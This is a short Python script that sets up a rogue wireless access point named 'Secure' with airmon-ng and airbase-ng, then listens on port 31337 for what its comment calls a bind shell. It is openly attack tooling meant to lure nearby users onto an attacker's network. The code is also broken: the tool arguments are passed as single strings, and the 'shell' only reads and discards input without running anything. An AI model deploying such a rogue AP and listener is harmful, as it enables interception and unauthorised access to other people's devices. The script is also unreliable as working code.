#!/usr/bin/env python
from subprocess import call
import socket, itertools;

#Need airmon-ng suite to do this

# Port to bind on
PORT = 31337

# start monitor mode on the wireless adapter
call(["airmon-ng", "start wlan0"])

# start the rouge AP on the wireless adapter
call(["airbase-ng", "-a 00:08:5B:6E:53:1A --essid 'Secure' -c 11 mon0"])

# start the bind shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); 
s.bind(('', PORT)); 
s.listen(1); 
accepter = s.accept(); 
reduce(lambda x, y: accepter[0].recv(1024), itertools.count())
